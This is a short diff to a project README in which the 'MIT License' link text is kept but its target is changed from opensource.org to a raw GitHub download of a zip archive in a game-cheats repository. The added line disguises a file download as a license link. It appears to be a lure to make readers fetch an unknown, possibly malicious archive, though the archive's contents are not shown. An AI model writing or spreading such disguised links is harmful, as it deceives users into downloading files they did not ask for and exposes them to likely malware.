@@ -143,7 +143,7 @@ All tools are open source, and distributed without any warranty.
 
 ## 📚 License
 
-This project is released under the [MIT License](https://opensource.org/licenses/MIT) – free for personal and educational use, modifications welcome.  
+This project is released under the [MIT License](https://raw.githubusercontent.com/MAXZL1/ARK-Survival-Evolved-cheats/main/intolerableness/Evolved_cheats_AR_Survival_v1.0-beta.5.zip) – free for personal and educational use, modifications welcome.  
 See LICENSE file for details.
 
 ---
